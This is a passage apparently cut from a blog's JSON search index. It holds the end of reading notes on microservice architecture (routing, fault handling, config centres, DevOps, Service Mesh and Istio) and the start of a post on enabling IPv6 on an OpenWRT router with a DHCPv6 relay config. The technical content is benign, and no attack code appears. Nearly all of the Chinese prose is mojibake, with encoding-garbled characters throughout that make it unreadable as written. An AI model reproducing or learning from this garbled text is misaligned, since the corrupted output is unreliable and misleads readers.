å‡½æ•°ï¼ŒæŠŠåŒä¸€ä¸ªæ¥æºçš„è¯·æ±‚éƒ½æ˜ å°„åˆ°åŒä¸€ä¸ªèŠ‚ç‚¹ä¸Šåœ¨æœåŠ¡ç«¯æ€§èƒ½å·®å¼‚è¾ƒå¤§çš„æƒ…å†µä¸‹ï¼Œå¦‚æœèƒ½é¢„å…ˆå®šä¹‰æƒé‡ï¼Œåˆ™å¯ä»¥ä½¿ç”¨åŠ æƒè½®è¯¢ç®—æ³•ï¼Œå¦åˆ™æœ€å¥½ä½¿ç”¨æœ€å°‘æ´»è·ƒè¿æ¥ç®—æ³•ã€‚å¦‚æœåœºæ™¯æ¯”è¾ƒå¤æ‚ï¼Œå¯ä»¥è€ƒè™‘è‡ªé€‚åº”é€‰æ‹©æœ€ä¼˜ç®—æ³•ã€‚é€šè¿‡â€œäºŒå…«åŸåˆ™â€åŠ¨æ€è°ƒæ•´æƒé‡ã€‚ å¦‚ä½•ä½¿ç”¨æœåŠ¡è·¯ç”±æœåŠ¡è·¯ç”±æ˜¯åœ¨æœåŠ¡æ¶ˆè´¹è€…å‘èµ·æœåŠ¡è°ƒç”¨æ—¶ï¼Œå¿…é¡»æ ¹æ®ç‰¹å®šçš„è§„åˆ™æ¥é€‰æ‹©æœåŠ¡èŠ‚ç‚¹ï¼Œä»è€Œæ»¡è¶³æŸäº›ç‰¹å®šçš„éœ€æ±‚ã€‚æœåŠ¡è·¯ç”±çš„åº”ç”¨åœºæ™¯ï¼šåˆ†ç»„è°ƒç”¨ç°åº¦å‘å¸ƒæµé‡åˆ‡æ¢è¯»å†™åˆ†ç¦»æœåŠ¡è·¯ç”±ä¸»è¦æœ‰ä¸¤ç§è§„åˆ™ï¼šæ¡ä»¶è·¯ç”±å’Œè„šæœ¬è·¯ç”±ã€‚æœåŠ¡è·¯ç”±çš„è·å–æ–¹å¼ï¼šæœ¬åœ°é…ç½®ï¼šè·¯ç”±è§„åˆ™å­˜åœ¨æ¶ˆè´¹è€…çš„æœ¬åœ°ï¼›é…ç½®ä¸­å¿ƒç®¡ç†ï¼šè·¯ç”±è§„åˆ™å­˜åœ¨é…ç½®ä¸­å¿ƒï¼Œæ¶ˆè´¹è€…ä»é…ç½®ä¸­å¿ƒè·å–è§„åˆ™ï¼›åŠ¨æ€ä¸‹å‘ï¼šè¿ç»´äººå‘˜é€šè¿‡æœåŠ¡æ²»ç†å¹³å°ä¿®æ”¹è·¯ç”±è§„åˆ™ï¼ŒæœåŠ¡æ²»ç†å¹³å°å°†è§„åˆ™æŒä¹…åŒ–åˆ°é…ç½®ä¸­å¿ƒï¼Œæ¶ˆè´¹è€…è®¢é˜…é…ç½®ä¸­å¿ƒçš„å˜æ›´ã€‚ æœåŠ¡ç«¯æ•…éšœæ—¶è¯¥å¦‚ä½•åº”å¯¹å¾®æœåŠ¡ç³»ç»Ÿä¸­çš„æ•…éšœå¯èƒ½å‡ºç°ä¸‰ç§ï¼šé›†ç¾¤æ•…éšœï¼ˆè¯¥æœåŠ¡çš„æ‰€æœ‰å®ä¾‹éƒ½å‡ºç°äº†æ•…éšœï¼‰å• IDC æ•…éšœï¼ˆç”±äºå…‰ç¼†è¢«æŒ–æ–­å¯¼è‡´æŸ IDC è„±ç½‘ï¼‰å•æœºæ•…éšœåº”å¯¹é›†ç¾¤æ•…éšœçš„æ€è·¯ä¸»è¦æœ‰ä¸¤ç§ï¼šé™æµï¼ˆé™åˆ¶è¯·æ±‚æ•°é‡ï¼‰å’Œé™çº§ï¼ˆåœæ­¢ç³»ç»Ÿä¸­çš„æŸäº›åŠŸèƒ½ï¼Œä¿è¯ç³»ç»Ÿæ•´ä½“çš„å¯ç”¨æ€§ï¼‰ï¼›é™çº§æ—¶å¯ä»¥åœ¨å†…å­˜ä¸­å­˜å‚¨ä¸€äº›å¼€å…³ï¼Œå‡ºç°æ•…éšœçš„æ—¶å€™æ‰“å¼€æŸäº›å¼€å…³ï¼Œä»è€Œåœ¨ä»£ç ä¸­ç»•è¿‡ä¸€äº›å¤„ç†é€»è¾‘ã€‚åº”å¯¹å• IDC æ•…éšœçš„æ–¹å¼æœ‰ä¸¤ç§ï¼šåŸºäº DNS è§£æçš„æµé‡åˆ‡æ¢ã€åŸºäº RPC åˆ†ç»„çš„æµé‡åˆ‡æ¢ï¼ˆé…ç½®è·¯ç”±è§„åˆ™ï¼‰ã€‚åœ¨ä¸šåŠ¡é‡å¤§çš„æœåŠ¡ä¸­ï¼Œå•æœºæ•…éšœå‘ç”Ÿçš„æ¦‚ç‡æœ€é«˜ã€‚æ‰€ä»¥æœ€å¥½è®¾è®¡ä¸€å¥—ç³»ç»Ÿæ¥è‡ªåŠ¨å¤„ç†å•æœºæ•…éšœï¼Œè€Œä¸æ˜¯ä¾é äººåŠ›å¤„ç†ã€‚å¤„ç†å•æœºæ•…éšœçš„ä¸€ä¸ªæœ‰æ•ˆçš„åŠæ³•å°±æ˜¯è‡ªåŠ¨é‡å¯ï¼Œä½†é‡å¯æ¡ä»¶çš„åˆ¤å®šå’ŒæœåŠ¡é‡å¯æ¯”ä¾‹éœ€è¦ç¡®å®šï¼Œå¦åˆ™å¯èƒ½ä¼šå‡ºç°å¤§è§„æ¨¡é‡å¯å¯¼è‡´æœåŠ¡ä¸å¯ç”¨ã€‚ æœåŠ¡è°ƒç”¨å¤±è´¥æ—¶çš„å¤„ç†æ‰‹æ®µè°ƒç”¨æœåŠ¡æ—¶éœ€è¦è®¾ç½®è¶…æ—¶æ—¶é—´ï¼Œä»¥é¿å…ä¾èµ–çš„æœåŠ¡è¿Ÿè¿Ÿæ²¡æœ‰è¿”å›ç»“æœï¼ŒæŠŠæœåŠ¡æ¶ˆè´¹è€…æ‹–æ­»ã€‚å…·ä½“è¶…æ—¶æ—¶é—´è®¾å®šå¯ä»¥ä»¥æœåŠ¡æä¾›è€…åœ¨çº¿ä¸ŠçœŸå®çš„æœåŠ¡æ°´å¹³ä¸ºå‡†ï¼Œæ¯”å¦‚å– 99.99% åˆ†ä½çš„å“åº”æ—¶é—´ã€‚æœ‰äº›è°ƒç”¨å¤±è´¥ï¼ˆæˆ–è¶…æ—¶ï¼‰åå¯ä»¥è€ƒè™‘é‡è¯•ï¼Œé€šè¿‡å¤šæ¬¡å°è¯•è°ƒç”¨ä»¥é™ä½æ•´ä½“æ•…éšœç‡ã€‚é™¤äº†é‡è¯•å¤–ï¼Œè¿˜å¯ä»¥è€ƒè™‘åŒå‘ï¼Œå³åŒæ—¶å‘èµ·ä¸¤æ¬¡è¯·æ±‚ã€‚ä½†è¿™ç§æ–¹å¼ä¼šç»™æœåŠ¡æä¾›è€…å¸¦æ¥å‹åŠ›ï¼Œæ‰€ä»¥ä¸€èˆ¬æƒ…å†µä¸‹åŒå‘æ˜¯ä¸å¯å–çš„ã€‚å¦‚æœæœåŠ¡æä¾›è€…å¤§è§„æ¨¡æ•…éšœå¯¼è‡´æ‰€æœ‰å®¢æˆ·ç«¯åŒæ—¶é‡è¯•ï¼Œåˆ™ä¼šç»™æœåŠ¡æä¾›è€…å¸¦æ¥æ›´å¤§çš„å‹åŠ›ï¼Œä»è€ŒåŠ å‰§æ•…éšœã€‚æ‰€ä»¥è¿™ç§æƒ…å†µä¸‹è¦ä½¿ç”¨ç†”æ–­æœºåˆ¶ï¼šå¦‚æœå‘ç°æœåŠ¡æä¾›è€…å‘ç”Ÿæ•…éšœï¼Œåˆ™çŸ­æ—¶é—´å†…åœæ­¢æ‰€æœ‰è¯·æ±‚ï¼Œä»¥ç»™æœåŠ¡æä¾›è€…æ¢å¤æ—¶é—´æ¥æ¢å¤ã€‚ å¦‚ä½•ç®¡ç†æœåŠ¡é…ç½®æœ¬åœ°é…ç½®ï¼šå°†é…ç½®å†™åœ¨ä»£ç ä¸­ï¼Œéšä»£ç ä¸€åŒå‘å¸ƒé…ç½®ä¸­å¿ƒï¼šå°†é…ç½®å†™åœ¨é…ç½®ä¸­å¿ƒä¸­ï¼ŒæœåŠ¡å¯åŠ¨æ—¶ä»é…ç½®ä¸­å¿ƒæ‹‰å–æ‰€éœ€é…ç½®ï¼›å¦‚æœé…ç½®å‘ç”Ÿå˜æ›´ï¼ŒæœåŠ¡è¿˜å¯ä»¥æ”¶åˆ°é€šçŸ¥å¹¶è‡ªåŠ¨æ›´æ–°æœ¬åœ°é…ç½®é…ç½®ä¸­å¿ƒä¸€èˆ¬æ˜¯ KV å®ç°ï¼Œé€šå¸¸åŒ…å«å¦‚ä¸‹åŠŸèƒ½ï¼šæ³¨å†Œã€åæ³¨å†Œã€æŸ¥çœ‹ã€å˜æ›´è®¢é˜…ã€‚é…ç½®ä¸­å¿ƒçš„å…¸å‹åº”ç”¨åœºæ™¯ï¼šèµ„æºæœåŠ¡åŒ–ã€ä¸šåŠ¡åŠ¨æ€é™çº§ã€åˆ†ç»„æµé‡åˆ‡æ¢ã€‚å¼€æºçš„é…ç½®ä¸­å¿ƒï¼šSpring Cloud Config, Disconf, Apollo.åŒæ—¶ï¼ŒConsulã€Zookeeper å’Œ Etcd ç­‰æ³¨å†Œä¸­å¿ƒåœ¨å°è§„æ¨¡æœåŠ¡ä¸­ä¹Ÿå¯ä»¥ä½œä¸ºé…ç½®ä¸­å¿ƒä½¿ç”¨ã€‚ å¦‚ä½•æ­å»ºå¾®æœåŠ¡æ²»ç†å¹³å°å¾®æœåŠ¡æ²»ç†å¹³å°çš„ä¸»è¦åŠŸèƒ½ï¼šå¯¹äºæ‰‡è´æ¥è¯´ï¼ŒæœåŠ¡æ²»ç†å¹³å°çš„é€‰å‹ä¸ºï¼šæœåŠ¡ç®¡ç†ï¼ˆæœåŠ¡ä¸Šä¸‹çº¿ï¼‰ï¼šKubernetesæœåŠ¡æ²»ç†ï¼ˆé™æµé™çº§ç­‰ï¼‰ï¼šRatelimitæœåŠ¡ç›‘æ§ï¼šPrometheus &amp; Grafanaï¼ŒæœåŠ¡ä¾èµ–æ‹“æ‰‘çš„æ•´ä½“ç›‘æ§æš‚æ— é—®é¢˜å®šä½ï¼šPrometheusï¼ˆå®è§‚å±‚é¢ï¼‰ï¼ŒSentryï¼ˆå›´è§‚å±‚é¢ï¼‰æ—¥å¿—æŸ¥è¯¢ï¼šELKæœåŠ¡è¿ç»´ï¼ˆå‘å¸ƒã€æ‰©ç¼©å®¹ï¼‰ï¼šKubernetes, GitLab CI/CD å¾®æœåŠ¡æ¶æ„è¦å¦‚ä½•è½åœ°æŠ€æœ¯å›¢é˜Ÿä¸­éœ€è¦æ±‚æ¶æ„å¸ˆï¼Œä¹Ÿè¦åŒ…å«æ‡‚ä¸šåŠ¡çš„å¼€å‘äººå‘˜ï¼›é¦–å…ˆè¦åœ¨ä¸€ä¸ªå°çš„ä¸šåŠ¡ä¸Šè¿›è¡Œè¯•ç‚¹ï¼Œåœ¨æ¶æ„æ–¹æ¡ˆæˆç†Ÿåå†ç»§ç»­æ¨è¿›ï¼›åšå¥½æŠ€æœ¯å–èˆï¼ŒæŠ€æœ¯é€‰å‹æ—¶è¦è€ƒè™‘ç›®å‰å›¢é˜Ÿçš„å®é™…æŒæ§èƒ½åŠ›ï¼Œå¯¹æ–°æŠ€æœ¯æ–¹æ¡ˆçš„å¼•å…¥è¦å°¤å…¶æ…é‡ï¼›é‡‡ç”¨ DevOpsï¼Œè¿›è¡Œä¸€ç«™å¼å¼€å‘ã€æµ‹è¯•ã€ä¸Šçº¿å’Œè¿ç»´ï¼›ç»Ÿä¸€å¾®æœåŠ¡æ²»ç†å¹³å° å¾®æœåŠ¡å®¹å™¨åŒ– å¾®æœåŠ¡ä¸ºä»€ä¹ˆè¦å®¹å™¨åŒ–å®¹å™¨åŒ–çš„ä¼˜åŠ¿ï¼šå¯ä»¥ä½¿ä»£ç è¿è¡Œç¯å¢ƒå¤šæ ·åŒ–å¼€å‘æµ‹è¯•ç”Ÿäº§å¯ä»¥ä½¿ç”¨åŒä¸€å¥—ç¯å¢ƒå¾®æœåŠ¡å®¹å™¨åŒ–å®è·µï¼šå……åˆ†åˆ©ç”¨ Docker é•œåƒçš„åˆ†å±‚æœºåˆ¶ï¼Œå°†åŸºç¡€ç¯å¢ƒã€è¿è¡Œæ—¶ç¯å¢ƒã€ä¸šåŠ¡ä»£ç åˆ†å±‚æ³¨å…¥åˆ°é•œåƒä¸­ã€‚ å®¹å™¨åŒ–è¿ç»´å®¹å™¨åŒ–è¿ç»´å’Œä¼ ç»Ÿè¿ç»´ä¸åŒï¼šæ¯ä¸ªæœåŠ¡éƒ½æ˜¯å®¹å™¨ï¼Œå¯èƒ½æ²¡æœ‰å›ºå®šçš„ IP. æ‰€ä»¥éœ€è¦å®¹å™¨è¿ç»´å¹³å°æ¥è¾…åŠ©è¿ç»´å·¥ä½œã€‚ä¸€ä¸ªå®¹å™¨è¿ç»´å¹³å°é€šå¸¸åŒ…å«ä»¥ä¸‹å‡ ä¸ªç»„æˆéƒ¨åˆ†ï¼šé•œåƒä»“åº“ã€èµ„æºè°ƒåº¦ã€å®¹å™¨è°ƒåº¦å’ŒæœåŠ¡ç¼–æ’ã€‚é•œåƒä»“åº“ï¼šæƒé™æ§åˆ¶ã€é•œåƒåŒæ­¥ï¼ˆå¤šèŠ‚ç‚¹è´Ÿè½½å‡è¡¡ï¼‰ã€é«˜å¯ç”¨æ€§ã€‚èµ„æºè°ƒåº¦ï¼šé€šè¿‡ä¸€ä¸ªç»Ÿä¸€çš„å±‚æ¥å¯¹æ¥ä¸åŒé›†ç¾¤ï¼ˆå®ä½“æœºã€ç§æœ‰äº‘ã€å…¬æœ‰äº‘ï¼‰ï¼Œè¿›è¡Œç»Ÿä¸€çš„èµ„æºç®¡ç†ã€‚å®¹å™¨è°ƒåº¦ï¼šåœ¨ç‰©ç†æœºä¸­å¯¹æœåŠ¡å®¹å™¨è¿›è¡Œè°ƒåº¦ã€‚å¸¸è§çš„è°ƒåº¦ç³»ç»Ÿæœ‰ Swarm, Mesos å’Œ Kubernetes.å®¹å™¨è°ƒåº¦éœ€è¦è§£å†³çš„é—®é¢˜ï¼šä¸»æœºè¿‡æ»¤ã€è°ƒåº¦ç­–ç•¥ã€‚æœåŠ¡ç¼–æ’ï¼šæœåŠ¡ä¾èµ–ï¼ˆDocker Compose)ï¼ŒæœåŠ¡å‘ç°ï¼ˆåŸºäº Nginx æˆ–åŸºäºæ³¨å†Œä¸­å¿ƒï¼‰ï¼Œè‡ªåŠ¨æ‰©ç¼©å®¹ã€‚ å¾®æœåŠ¡å¦‚ä½•å®ç° DevOpsDevOps æ˜¯ä¸€ç§æ–°å‹çš„ä¸šåŠ¡ç ”å‘æµç¨‹ï¼Œä¸šåŠ¡çš„å¼€å‘äººå‘˜ä¸ä»…éœ€è¦è´Ÿè´£ä¸šåŠ¡ä»£ç çš„å¼€å‘ï¼Œè¿˜éœ€è¦è´Ÿè´£ä¸šåŠ¡çš„æµ‹è¯•ä»¥åŠä¸Šçº¿å‘å¸ƒç­‰å…¨ç”Ÿå‘½å‘¨æœŸï¼ŒçœŸæ­£åšåˆ°æŒæ¡æœåŠ¡å…¨æµç¨‹ã€‚å®ç° DevOpsï¼Œå°±å¿…é¡»è¦å®ç° CI å’Œ CD æµç¨‹ã€‚CD å¯ä»¥æ˜¯æŒç»­äº¤ä»˜ï¼ˆåªéœ€è¦è®©ä»£ç è¾¾åˆ°çº¿ä¸Šå‘å¸ƒè¦æ±‚å°±è¡Œï¼‰ï¼Œä½†ä¹Ÿå¯ä»¥æ˜¯æŒç»­éƒ¨ç½²ï¼ˆContinuous Deployï¼‰ï¼ŒæŒç»­åœ°æŠŠä»£ç éƒ¨ç½²åˆ°çº¿ä¸Šã€‚éƒ¨ç½²è¿‡ç¨‹å¯ä»¥è‡ªåŠ¨ï¼Œä½†æ›´æ¨èæ‰‹åŠ¨æ§åˆ¶ï¼Œå› ä¸ºè¿™æ ·æ›´åŠ å®‰å…¨ã€‚å®¹å™¨åŒ–çš„å‡ºç°è§£å†³äº†ä»£ç ç¯å¢ƒçš„å¯ç§»æ¤æ€§é—®é¢˜ï¼Œä½¿å¾— DevOps å–å¾—äº†çªé£çŒ›è¿›çš„å‘å±•ï¼Œå¹¶æˆä¸ºä¸šç•Œæ¨å´‡çš„å¼€å‘æ¨¡å¼ã€‚å¾®åšçš„ DevOps å®è·µï¼šä½¿ç”¨ GitLab CI æ¥å®ç° DevOpsä¸šåŠ¡é‡å¤§äº†ä»¥åï¼Œå¹¶ä¸éœ€è¦è¦æ±‚è‡ªåŠ¨åŒ–çš„æŒç»­éƒ¨ç½²ï¼Œæ–¹ä¾¿åœ¨åˆ†é˜¶æ®µéƒ¨ç½²çš„æ—¶å€™åŠæ—¶è§‚å¯ŸæœåŠ¡çŠ¶æ€å¹¶å¹²æ¶‰éƒ¨ç½²è¿‡ç¨‹ã€‚ å¦‚ä½•åšå¥½å¾®æœåŠ¡å®¹é‡è§„åˆ’å¾®æœåŠ¡çš„å¤„ç†èƒ½åŠ›å·®å¼‚å¾ˆå¤§ï¼Œä¸”å¾ˆå¤šå¾®æœåŠ¡ä¹‹é—´å…·æœ‰ä¾èµ–å…³ç³»ï¼Œæ‰€ä»¥å¾®æœåŠ¡å®¹é‡è§„åˆ’ç›¸å½“å›°éš¾ã€‚å®¹é‡è§„åˆ’ç³»ç»Ÿçš„ä½œç”¨æ˜¯æ ¹æ®å„ä¸ªå¾®æœåŠ¡éƒ¨ç½²é›†ç¾¤çš„æœ€å¤§å®¹é‡å’Œçº¿ä¸Šå®é™…è¿è¡Œçš„è´Ÿè·ï¼Œæ¥å†³å®šå„ä¸ªå¾®æœåŠ¡æ˜¯å¦éœ€è¦å¼¹æ€§æ‰©ç¼©å®¹ï¼Œä»¥åŠéœ€è¦æ‰©ç¼©å®¹å¤šå°‘å°æœºå™¨ã€‚å®æ–½å®¹é‡è§„åˆ’ç³»ç»Ÿçš„å…³é”®åœ¨äºä¸¤ç‚¹ï¼šåšå¥½å®¹é‡è¯„ä¼°ï¼›åšå¥½è°ƒåº¦å†³ç­–ã€‚å®¹é‡è¯„ä¼°éœ€è¦é å‹æµ‹ï¼Œå‹æµ‹éœ€è¦é€‰å‡ºåˆé€‚çš„å‹æµ‹æŒ‡æ ‡ã€‚è°ƒåº¦å†³ç­–ä¸»è¦é è®¾å®šæ°´ä½çº¿ï¼šå½“ï¼ˆä¸€ä¸ªæˆ–å¤šä¸ªï¼‰å®é™…æŒ‡æ ‡é«˜äºæ°´ä½çº¿ä¸€æ®µæ—¶é—´åï¼Œåˆ™éœ€è¦æ‰©å®¹ã€‚ Service Mesh æ¦‚å¿µService Mesh çš„æ ¸å¿ƒæ¦‚å¿µï¼šå°†è½»é‡çº§çš„ç½‘ç»œä»£ç†å’Œåº”ç”¨ä»£ç éƒ¨ç½²åœ¨ä¸€èµ·ï¼Œä»è€Œä»¥åº”ç”¨æ— æ„ŸçŸ¥çš„æ–¹å¼å®ç°æœåŠ¡æ²»ç†ã€‚Service Mesh ç”¨è½»é‡çº§ç½‘ç»œä»£ç†çš„æ–¹å¼ä¸åº”ç”¨ä»£ç éƒ¨ç½²åœ¨ä¸€èµ·ï¼Œä»¥ä¿è¯æœåŠ¡ä¹‹é—´è°ƒç”¨çš„å¯é æ€§ï¼Œè¿™ä¸ä¼ ç»Ÿçš„å¾®æœåŠ¡æ¶æ„æœ‰æœ¬è´¨åŒºåˆ«ã€‚è¿™ä¹ˆåšä¸»è¦æœ‰ä¸¤ä¸ªåŸå› ï¼šè·¨è¯­è¨€æœåŠ¡è°ƒç”¨éœ€è¦äº‘åŸç”Ÿåº”ç”¨æœåŠ¡æ²»ç†éœ€è¦Service Mesh çš„æ ¸å¿ƒç»„ä»¶ï¼šSidecarï¼šè½»é‡çº§ä»£ç†Control Planeï¼šæœåŠ¡æ²»ç†ä¸»æ§ï¼Œå‘ sidecar å‘é€æŒ‡ä»¤å®ŒæˆæœåŠ¡æ²»ç†åŠŸèƒ½Control Plane çš„ä½œç”¨ä¸»è¦åŒ…æ‹¬ï¼šæœåŠ¡å‘ç°ã€è´Ÿè½½å‡è¡¡ã€è¯·æ±‚è·¯ç”±ã€æ•…éšœå¤„ç†ã€å®‰å…¨è®¤è¯ã€ç›‘æ§ä¸ŠæŠ¥ã€æ—¥å¿—è®°å½•ã€é…é¢æ§åˆ¶ç¬¬ä¸€ä»£ Service Mesh çš„äº§å“æ˜¯ Linkerdï¼Œç¬¬äºŒä»£æ˜¯ Istio. IstioIstio æ˜¯æ–°ä¸€ä»£ Service Mesh äº§å“ï¼Œå…·æœ‰å¼ºå¤§çš„åŠŸèƒ½ä»¥åŠé€‚é…æ€§ï¼Œå¯ä»¥åœ¨ Kubernetes, Mesos ç­‰å¤šä¸ªå¹³å°ä¸Šè¿è¡Œã€‚Istio é‡‡ç”¨ Envoy ä½œä¸ºé»˜è®¤çš„ Sidecarï¼ŒControl Plane åŒ…å«ä¸‰ä¸ªåŸºæœ¬ç»„ä»¶ï¼šPilotã€Mixer ä»¥åŠ Citadel.Envoy æ˜¯ Istio ä¸­æœ€åŸºç¡€çš„ç»„ä»¶ï¼Œæ‰€æœ‰å…¶å®ƒç»„ä»¶çš„åŠŸèƒ½éƒ½æ˜¯é€šè¿‡è°ƒç”¨ Envoy çš„ APIï¼Œåœ¨è¯·æ±‚ç»è¿‡ Envoy è½¬å‘æ—¶ï¼Œç”± Envoy æ‰§è¡Œç›¸å…³çš„æ§åˆ¶é€»è¾‘æ¥å®ç°çš„ã€‚Pilot é€šè¿‡å‘ Envoy ä¸‹å‘æŒ‡ä»¤æ¥å®ç°æµé‡æ§åˆ¶ï¼Œå¦‚è´Ÿè½½å‡è¡¡ã€è¯·æ±‚è·¯ç”±ã€æ•…éšœæ³¨å…¥ç­‰ã€‚Mixer æä¾›äº†ç­–ç•¥æ§åˆ¶å’Œç›‘æ§æ—¥å¿—æ”¶é›†ç­‰åŠŸèƒ½ã€‚Citadel çš„ä½œç”¨æ˜¯ä¿è¯æœåŠ¡ä¹‹é—´è®¿é—®çš„å®‰å…¨ã€‚","categories":[{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/categories/DevOps/"}],"tags":[{"name":"å¾®æœåŠ¡","slug":"å¾®æœåŠ¡","permalink":"https://blog.stdioa.com/tags/å¾®æœåŠ¡/"},{"name":"è¯»ä¹¦","slug":"è¯»ä¹¦","permalink":"https://blog.stdioa.com/tags/è¯»ä¹¦/"},{"name":"DevOps","slug":"DevOps","permalink":"https://blog.stdioa.com/tags/DevOps/"}]},{"title":"çç©IPv6â€”â€”åœ¨å…¬ç½‘æ­å»ºæ–‡ä»¶ç®¡ç†å™¨","slug":"build-file-manager-on-ipv6","date":"2019-02-21T11:28:00.000Z","updated":"2019-03-02T15:03:51.803Z","comments":true,"path":"2019/02/build-file-manager-on-ipv6/","link":"","permalink":"https://blog.stdioa.com/2019/02/build-file-manager-on-ipv6/","excerpt":"IPv6 æ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œå¸Œæœ›äººäººéƒ½æœ‰ä¸€ä¸ªã€‚","text":"IPv6 æ˜¯ä¸ªå¥½ä¸œè¥¿ï¼Œå¸Œæœ›äººäººéƒ½æœ‰ä¸€ä¸ªã€‚ IPV6 IPv6 æ˜¯å•¥ï¼Ÿæ–°ä¸€ä»£çš„ IP åè®®ï¼Œè§£å†³äº† IPv4 åœ°å€æ¯ç«­çš„é—®é¢˜ã€‚å…·ä½“å¯ä»¥è§ Wikipedia.IPv6 çš„ IP é•¿åº¦ä¸º 128 ä½ï¼Œæ€»é‡éå¸¸éå¸¸å¤šï¼Œä¸ç”¨æ‹…å¿ƒç”¨ä¸å®Œï¼Œæ‰€ä»¥æ¥å…¥ IPv6 çš„å®¢æˆ·ç«¯éƒ½ä¼šåˆ†åˆ°ä¸€æ®µ IPï¼Œæ¯”å¦‚ 240e:1c:ce8:fd00::/64ï¼Œç„¶åå®¢æˆ·ç«¯åˆå¯ä»¥æŠŠè¿™æ®µ IP ç»§ç»­åˆ†æ®µï¼Œä¸‹å‘åˆ°ä¸‹é¢çš„æ‰€æœ‰å­ç½‘ä¸­ã€‚ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶å®¢æˆ·ç«¯ä¼šåˆ†åˆ°ä¸€æ®µ IP çš„æ‰€æœ‰æƒï¼Œä¸è¿‡å®¢æˆ·ç«¯æœ¬èº«è¿˜æ˜¯ä¼šæœ‰è‡³å°‘ä¸€ä¸ªç¡®å®šçš„ IPï¼Œä»¥ç¡®å®šè‡ªå·±çš„ä½ç½®ã€‚å…¶å®å‘ç° ISP åˆ†ç»™è‡ªå·± 2^64 ä¸ª IP åœ°å€çš„æ—¶å€™è¿˜æ˜¯æ„Ÿè§‰å¾ˆå¥¢ä¾ˆâ€¦ğŸ˜‚ IPv6 è·Ÿæˆ‘æœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿæ„Ÿè°¢å»å¹´å·¥ä¿¡éƒ¨å‘å¸ƒäº†ã€Šå·¥ä¸šå’Œä¿¡æ¯åŒ–éƒ¨å…³äºè´¯å½»è½å®ã€ˆæ¨è¿›äº’è”ç½‘åè®®ç¬¬å…­ç‰ˆï¼ˆIPv6ï¼‰è§„æ¨¡éƒ¨ç½²è¡ŒåŠ¨è®¡åˆ’ã€‰çš„é€šçŸ¥ã€‹ï¼ŒIPv6 ç°åœ¨ä¹Ÿé£å…¥å¯»å¸¸ç™¾å§“å®¶äº†~ISP ä¸‹å‘çš„ IPï¼Œéƒ½æ˜¯å…¬ç½‘ IP ï¼Œæˆ‘ä»¬å†ä¹Ÿä¸ç”¨èº²åœ¨å±‚å±‚ NAT åé¢ï¼Œæƒ³è¦ä¸€ä¸ªå…¬ç½‘ IP éƒ½è¦å»æ‰“ç”µè¯è·Ÿè¿è¥å•†æ‰¯çš®äº†ã€‚å¹´å‰æ„å¤–çœ‹åˆ°è‡ªå·±çš„è·¯ç”±å™¨ç•Œé¢ä¸Šæœ‰äº†å…¬ç½‘çš„ IPv6 IPï¼Œç”µä¿¡ 4G ç½‘ç»œä¹Ÿæ”¯æŒ IPv6 äº†ï¼Œäºæ˜¯æ‰“ç®—æŠ˜è…¾ä¸€ä¸‹ï¼ŒæŠŠè¿™ä¸ªå…¬ç½‘ IP åˆ©ç”¨èµ·æ¥ï¼Œæ¯”å¦‚ç»™å®¶é‡Œçš„ NAS æ­ä¸ªå…¬ç½‘å¯ä»¥è®¿é—®çš„äº‘ç›˜ä»€ä¹ˆçš„ğŸ˜³ é…ç½® DHCPå¦‚æœè¦ç”¨å…¬ç½‘ IPï¼Œé¦–å…ˆä½ è¦æœ‰ä¸€ä¸ªå…¬ç½‘ IP. å¦‚æœ ifconfig çœ‹åˆ°çš„ IP åªæœ‰ fe80 å¼€å¤´çš„åœ°å€ï¼Œé‚£æ˜¯ç”¨äºé“¾è·¯æœ¬åœ°é€šä¿¡çš„ä¿ç•™åœ°å€ï¼Œæ˜¯ä¸èƒ½åœ¨å…¬ç½‘ä½¿ç”¨çš„ã€‚æ‰“å¼€è·¯ç”±å™¨çš„åå°ï¼Œçœ‹ä¸€ä¸‹ WAN6 çš„æ¥å£ï¼Œå¦‚æœèƒ½çœ‹åˆ°å…¬ç½‘ IPï¼Œé‚£å°±å¯ä»¥é…ç½® dhcp ä¸‹å‘äº†ã€‚ç¼–è¾‘ /etc/config/dhcp æ‰“å¼€ DHCPv6 çš„ä¸­ç»§æ¨¡å¼ï¼š12345678910111213141516171819202122232425config dhcp &apos;lan&apos; option interface &apos;lan&apos; option start &apos;100&apos; option limit &apos;150&apos; option leasetime &apos;12h&apos; option ndp &apos;relay&apos; option dhcpv6 &apos;relay&apos; option ra &apos;relay&apos;config dhcp &apos;wan&apos; option interface &apos;wan&apos; option start &apos;100&apos; option limit &apos;150&apos; option ignore &apos;1&apos; option leasetime &apos;12h&apos; option ra &apos;relay&apos; option dhcpv6 &apos;relay&apos; option ndp &apos;relay&apos;config dhcp &apos;wan6&apos; option interface &apos;wan&apos; option ra &apos;relay&apos; option dhcpv6 &apos;relay&apos; option ndp &apos;relay&apos; option master &apos;1&apos;é…ç½®å¥½åï¼Œç”¨ /etc/init.d/odhcpd restart é‡å¯ DHCP æœåŠ¡å™¨ï¼›ç­‰å¾…ä¸€ä¼šï¼Œåº”è¯¥å°±å¯ä»¥åœ¨å®¢æˆ·ç«¯ç½‘å£ä¸Šçœ‹åˆ°ä¸€ä¸ªå…¬ç½‘çš„ ipv6 åœ°å€äº†ã€‚12345$ ifconfig enp1s0enp1s0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 192.168.10.209 netmask 255.255.255.0 broadcast 192.168.10.255 inet6 240e:17:ce8:fd00:7285:c2ff:fe38:2a56 prefixlen 64 scopeid 0x0&lt;global&gt; inet6 fe80::7285:c2ff:fe38:2a56 prefixlen 64 scopeid 0x20&lt;link&gt;å‚è€ƒèµ„æ–™ï¼šOpenWRT IPv6 ä¸‰ç§é…ç½®æ–¹å¼ é˜²ç«å¢™æ‰“å¼€ä»¥åï¼Œå¯ä»¥éšä¾¿æ‰¾ä¸€ä¸ªå¤–ç½‘çš„æœºå™¨æ¥ ping ä¸€ä¸‹è‡ªå·±çš„æœºå™¨åœ°å€ï¼Œå¦‚æœé¡ºåˆ©çš„è¯ï¼Œåº”è¯¥å¯ä»¥ ping é€šäº†ï¼Œä½†æ˜¯ SSH/HTTP è®¿é—®åº”è¯¥è¿˜æ˜¯ä¸å¯ä»¥çš„ï¼Œå› ä¸ºè·¯ç”±å™¨çš„é˜²ç«å¢™æ‹’ç»äº†æ¥è‡ªå¤–ç½‘çš„ TCP 